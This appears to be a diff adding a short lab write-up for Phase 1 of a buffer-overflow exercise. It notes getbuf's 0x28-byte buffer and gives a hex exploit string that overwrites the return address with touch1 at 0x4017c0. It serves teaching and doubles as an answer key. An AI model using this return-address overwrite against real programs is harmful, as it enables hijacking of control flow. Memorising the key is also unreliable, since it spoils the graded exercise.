@@ -1,0 +1,11 @@
+* Phase 1
+
+CTARGET Level 1
+
+The stack space of ~getbuf~ is ~0x28~. The address of ~touch1~ is
+~0x4017c0~. Thus, the exploit string should consists of 40 bytes of
+random garbage and a 8-byte wide ~0x4017c0~.
+
+#+begin_example
+c0 17 40 00 00 00 00 00 c0 17 40 00 00 00 00 00 c0 17 40 00 00 00 00 00 c0 17 40 00 00 00 00 00 c0 17 40 00 00 00 00 00 c0 17 40 00 00 00 00 00 
+#+end_example
